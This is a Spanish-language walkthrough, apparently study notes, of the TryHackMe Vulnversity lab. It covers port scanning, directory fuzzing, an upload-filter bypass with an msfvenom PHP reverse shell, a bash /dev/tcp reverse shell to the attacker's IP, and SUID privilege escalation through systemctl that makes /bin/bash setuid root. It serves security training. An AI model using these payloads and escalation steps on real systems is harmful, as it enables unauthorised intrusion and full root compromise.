Maquinas que vamos a utilizar **Kali Linux y Vulnversity** [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

  

Otra técnica muy frecuente para escalar privilegios en Linux es la enumeración de binarios SUID, donde podremos conocer que binarios tienen **setuid 0** y podemos utilizarlos para escalar privilegios en Linux.

  

> [!important] El **setuid** (Set User ID) es un permiso especial en sistemas operativos basados en Unix que permite a los usuarios ejecutar un archivo con los privilegios del propietario del archivo, en lugar de con los suyos propios. Esto es útil para tareas que requieren permisos elevados, como cambiar contraseñas o enviar paquetes de red.
> 
> Cuando un archivo tiene **setuid 0**, significa que se ejecutará con los privilegios del usuario **root** (ID 0), lo que le otorga acceso total al sistema.

  

```Bash
ping -c 1 10.10.211.221
```

![[Imagenes/image 57.png|image 57.png]]

  

> [!important] Vamos a hacer la intrusión a esta maquina que ya la habíamos visto antes y después haremos la escalada de privilegios.
> 
>   

  

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.10.211.221
```

![[Imagenes/image 1 46.png|image 1 46.png]]

  

- Miramos en el navegador
    
    ![[Imagenes/image 2 45.png|image 2 45.png]]
    

  

- Hacemos **Fuzzing Web con gobuster.**
    
    ```Bash
    gobuster dir -u http://10.10.211.221:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![[Imagenes/image 3 44.png|image 3 44.png]]
    

  

- Lo miramos en el navegador web y vemos que tenemos un panel de subida de archivos.
    
    `http://10.10.211.221:3333/internal/index.php`
    
    ![[Imagenes/image 4 42.png|image 4 42.png]]
    

  

- Nos creamos un payload con msfvenom
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned.php 
    ```
    
    ![[Imagenes/image 5 41.png|image 5 41.png]]
    

  

- Como la extensión php no esta permitida en este panel le vamos a cambiar la extensión.
    
    ```Bash
    mv pwned.php pwned.phtml
    ```
    
    ![[Imagenes/image 6 39.png|image 6 39.png]]
    

  

- Lo intentamos subirlo
    
    ![[Imagenes/image 7 37.png|image 7 37.png]]
    

  

- Volvemos a hacer **Fuzzing Web** pero esta vez de `[http://10.10.211.221:3333/internal/](http://10.10.211.221:3333/internal/)` para encontrar la carpeta donde se guardan los archivos subidos.
    
    ```Bash
    gobuster dir -u http://10.10.211.221:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![[Imagenes/image 8 35.png|image 8 35.png]]
    

  

- Lo miramos en el navegador web.
    
    ![[Imagenes/image 9 32.png|image 9 32.png]]
    
- Nos ponemos a la escucha con netcat por el puerto 443.
    
    ```Bash
    nc -nlvp 443
    ```
    
    ![[Imagenes/image 10 28.png|image 10 28.png]]
    

  

> [!important] Como es una conexión por msfvenom y es muy inestable vamos a a estabilizarla.

  

- Nos ponemos a la escucha con netcat por el puerto 444 en otra terminal
    
    ```Bash
    nc -nlvp 444 
    ```
    
    ![[Imagenes/image 11 22.png|image 11 22.png]]
    

  

- Nos vamos a la pagina [https://www.revshells.com/](https://www.revshells.com/) y creamos y copiamos el código de una reverse shell.
    
    ![[Imagenes/image 12 22.png|image 12 22.png]]
    

Que quedaría así :  
  
  
`bash -c "sh -i >& /dev/tcp/10.21.166.149/444 0>&1"`

  

- ejecutamos el archivo malicioso y cuando tengamos la conexión pegamos el código para generar una conexión estable por el puerto 444.
    
    ![[Imagenes/image 13 21.png|image 13 21.png]]
    

![[Imagenes/image 14 19.png|image 14 19.png]]

  

  

---

  

**Comenzamos con la escalada de privilegios**

  

![[Imagenes/image 15 16.png|image 15 16.png]]

  

- Ejecuto el comando **sudo -l**
    
    `sudo -l`
    
    ![[Imagenes/image 16 13.png|image 16 13.png]]
    
    😲😲 No funciona 😲
    

  

- Vamos a hacer la siguiente búsqueda para buscar binarios vulnerable (con el permiso de root dentro del sistema. y Lugo comprobaremos en la web [https://gtfobins.github.io/](https://gtfobins.github.io/) si alguno de esos vinarios nos puede servir.
    
    `find / -perm -4000 2>/dev/null`
    
    ![[Imagenes/image 17 10.png|image 17 10.png]]
    

- Vamos a probar por ejemplo el binario **chfn**
    
    ![[Imagenes/image 18 8.png|image 18 8.png]]
    
    Vemos que no aparece.
    
      
    
- Probamos con **systemctl**
    
    ![[Imagenes/image 19 6.png|image 19 6.png]]
    

  

Lo que estamos haciendo básicamente ahora es **SUID** por lo tanto buscamos la instrucciones para el.

![[Imagenes/image 20 6.png|image 20 6.png]]

  

  

- Pero primero vamos a hacer un tratamiento de la TTY
    
    `script /dev/null -c bash`
    
    `CTRL+Z`
    
    `stty raw -echo; fg`
    
    `reset xterm` :
    
    **NOTA:** En ocasiones cuanto escribimos **reset xterm** no aparece en la pantalla pero se esta escribiendo.
    
    ![[Imagenes/image 21 5.png|image 21 5.png]]
    

`export TERM=xterm`  
  
`export SHELL=bash`

  

- Nos ubicamos en el directorio “/**tmp**” y nos creamos un script en bash con el contenido que hemos encontrado en [https://gtfobins.github.io/](https://gtfobins.github.io/).
    
    `cd /tmp`
    
    `nano` `[escalada.sh](http://escalada.sh/)`
    
    ![[Imagenes/image 22 5.png|image 22 5.png]]
    
    ![[Imagenes/image 23 5.png|image 23 5.png]]
    
    ![[Imagenes/image 24 4.png|image 24 4.png]]
    
    Modificamos esto: `"id > /tmp/output"` → `"chmod u+s /bin/bash"`
    
      
    
    > [!important] Cada elemento del comando cumple una función específica:
    > 
    > 🔹 `**chmod**` → Es el comando que se usa para **cambiar los permisos** de archivos en Linux.
    > 
    > 🔹 `**u+s**` → Se divide en dos partes:
    > 
    > - `**u**` → Representa el **usuario propietario** del archivo (normalmente root).
    > - `**+s**` → Habilita el **bit SUID (Set User ID)**, lo que permite que el programa se ejecute con los privilegios de su propietario en lugar de los del usuario que lo ejecuta.  
    >     🔹  
    >     `**/bin/bash**` → Es el archivo al que se le aplican los nuevos permisos. En este caso, el ejecutable de **Bash**, la shell de comandos de Linux.
    > 
    > Esto significa que **podría ejecutar comandos con privilegios de administrador**, lo que puede ser un grave **riesgo de seguridad**.
    
      
    
- Ejecutamos el archivo que acabamos de crear.
    
    `bash` `[escalada.sh](http://escalada.sh/)`
    
    ![[Imagenes/image 25 4.png|image 25 4.png]]
    
    😲😲**Me da un error** 😱
    

El error es que en el archivo **esta puesta la ruta relativa** y dentro de lo posible siempre hay que evitar esto y **poner la ruta absoluta**.

![[Imagenes/image 26 2.png|image 26 2.png]]

La ruta la encontrábamos aquí anteriormente. `/bin/systemctl`

![[Imagenes/image 27 2.png|image 27 2.png]]

**Quedando asi:**

![[Imagenes/image 28 2.png|image 28 2.png]]

  

- Volvemos a ejecutar el archivo que habíamos creado.
    
    `bash` `[escalada.sh](http://escalada.sh/)`
    
    ![[Imagenes/image 29 2.png|image 29 2.png]]
    

  

- Escribimos el siguiente comando y nos habremos convertimos en **root**.
    
    `bash -p`
    
    ![[Imagenes/image 30 2.png|image 30 2.png]]